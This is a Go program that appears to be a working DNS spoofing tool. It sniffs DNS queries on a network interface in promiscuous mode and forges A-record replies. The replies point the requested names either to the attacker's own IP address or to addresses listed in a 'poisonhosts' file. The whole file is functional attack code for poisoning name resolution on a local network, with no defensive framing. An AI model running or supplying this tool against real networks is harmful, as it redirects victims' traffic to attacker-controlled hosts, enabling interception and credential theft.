package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/pborman/getopt"
)

var (
	device      string = "eth0"
	snapshotLen int32  = 1024
	promiscuous bool   = true
	err         error
	handle      *pcap.Handle
	// inter_face   string
	string_input   *string
	poison_dict    map[string]string
	file_available bool = false
	input_array    []string
	input          string
)

func main() {
	// var dev string = "eth0"
	inter_face := getopt.String('i', "eth0", "The interface")
	poison_file := getopt.String('f', "poisonhosts", "Read poisoning file")
	getopt.Parse()
	if getopt.IsSet('f') {
		file_available = true
		file, err := os.Open(*poison_file)
		if err != nil {
			log.Fatalf("Failed to open the file mentioned. Spoofing all DNS Requests")
		}
		//Creating mapping for DNS => spoofed_IP that needs to be spoofed as per the file
		scanner := bufio.NewScanner(file)
		scanner.Split(bufio.ScanLines)
		poison_dict = make(map[string]string)
		for scanner.Scan() {
			text := strings.Fields(scanner.Text())
			poison_dict[text[1]] = text[0]
		}
		file.Close()
	}
	if len(getopt.Args()) > 0 {
		input_array = getopt.Args()
		input = strings.Join(input_array, " ")
		// handle.SetBPFFilter(input)
	} else {
		input = "udp and port 53"
	}
	spoof(*inter_face)
}
func getIfaceAddr() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		os.Stderr.WriteString("Oops: " + err.Error() + "\n")
		os.Exit(1)
	}
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return (ipnet.IP.String())
			}
		}
	}
	return ""
}
func spoof(ifacename string) {
	// get our local ip
	// ip := getIfaceAddr(ifacename)
	ip := getIfaceAddr()
	var questions []string
	// fmt.Println(ip)
	if ip == "" {
		panic("Unable to get IP")
	}
	// // open a handle to the network card(s)
	ifaceHandle, err := pcap.OpenLive(ifacename, 1024, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	}
	defer ifaceHandle.Close()
	// set the filter
	// fmt.Println("input:", input)
	err = ifaceHandle.SetBPFFilter(input)
	if err != nil {
		// not fatal
		fmt.Printf("Unable to set filter: %v\n", err.Error())
	}
	// pre-allocate all the space needed for the layers
	var ethLayer layers.Ethernet
	var ipv4Layer layers.IPv4
	var udpLayer layers.UDP
	var dnsLayer layers.DNS
	var q layers.DNSQuestion
	var a layers.DNSResourceRecord
	// create the decoder for fast-packet decoding
	// (using the fast decoder takes about 10% the time of normal decoding)
	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
	// this slick will hold the names of the layers successfully decoded
	decodedLayers := make([]gopacket.LayerType, 0, 4)
	// pre-create the response with most of the data filled out
	a.Type = layers.DNSTypeA
	a.Class = layers.DNSClassIN
	a.TTL = 300
	a.IP = net.ParseIP(ip)
	// create a buffer for writing output packet
	outbuf := gopacket.NewSerializeBuffer()
	// TODO (Optionally) replace with NewSerializeBufferExpectedSize to speed up a bit more
	// set the arguments for serialization
	serialOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	// pre-allocate loop counter
	var i uint16
	// swap storage for ip and udp fields
	var ipv4Addr net.IP
	var udpPort layers.UDPPort
	var ethMac net.HardwareAddr
	// Main loop for dns packets intercepted
	// No new allocations after this point to keep garbage collector
	// cyles at a minimum
	for {
		packetData, _, err := ifaceHandle.ZeroCopyReadPacketData()
		if err != nil {
			break
		}
		isSpoofNeeded := false
		// decode this packet using the fast decoder
		err = decoder.DecodeLayers(packetData, &decodedLayers)
		if err != nil {
			fmt.Println("Decoding error!")
			continue
		}
		//filtering your own ip from spoofing
		// fmt.Println(ipv4Layer)
		if ipv4Layer.SrcIP.String() == ip || ipv4Layer.DstIP.String() == ip {
			continue
		}
		// only proceed if all layers decoded
		if len(decodedLayers) != 4 {
			fmt.Println("Not enough layers!")
			continue
		}
		// check that this is not a response
		if dnsLayer.QR {
			continue
		}
		// set this to be a response
		dnsLayer.QR = true
		// if recursion was requested, it is available
		if dnsLayer.RD {
			dnsLayer.RA = true
		}
		// for each question

		questions = questions[:0]
		for i = 0; i < dnsLayer.QDCount; i++ {
			// get the question
			q = dnsLayer.Questions[i]
			questions = append(questions, string(q.Name))
			// fmt.Println("Question Name: ", string(q.Name))
			// verify this is an A-IN record question
			if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
				continue
			}
			// copy the name across to the response
			if file_available == true {
				// fmt.Println("File value : ", poison_dict[string(q.Name)])
				// fmt.Println("File value : ", poison_dict)
				if _, value_ := poison_dict[string(q.Name)]; value_ {
					a.Name = q.Name
					isSpoofNeeded = true
					a.IP = net.ParseIP(poison_dict[string(q.Name)])
				} else {
					continue
				}
			} else {
				isSpoofNeeded = true
				a.Name = q.Name
			}
			// append the answer to the original query packet
			dnsLayer.Answers = append(dnsLayer.Answers, a)
			dnsLayer.ANCount = dnsLayer.ANCount + 1
		}

		fmt.Println("DNS Packet found:")
		var output string
		output = ethLayer.SrcMAC.String() + " > " + ethLayer.DstMAC.String() + " "
		output += ipv4Layer.SrcIP.String() + "." + udpLayer.SrcPort.String() + " > " + ipv4Layer.DstIP.String() + "." + udpLayer.DstPort.String() + " "
		output += strconv.Itoa(int(dnsLayer.ID)) + " A? "
		for _, question := range questions {
			output += question + " "
		}
		fmt.Println(output)

		if isSpoofNeeded == false {
			continue
		}

		// swap ethernet macs
		ethMac = ethLayer.SrcMAC
		ethLayer.SrcMAC = ethLayer.DstMAC
		ethLayer.DstMAC = ethMac
		// swap the ip
		ipv4Addr = ipv4Layer.SrcIP
		ipv4Layer.SrcIP = ipv4Layer.DstIP
		ipv4Layer.DstIP = ipv4Addr
		// swap the udp ports
		udpPort = udpLayer.SrcPort
		udpLayer.SrcPort = udpLayer.DstPort
		udpLayer.DstPort = udpPort
		// set the UDP to be checksummed by the IP layer
		err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
		if err != nil {
			panic(err)
		}
		// serialize packets
		err = gopacket.SerializeLayers(outbuf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
		if err != nil {
			panic(err)
		}
		// write packet
		err = ifaceHandle.WritePacketData(outbuf.Bytes())
		if err != nil {
			panic(err)
		}

	}
}
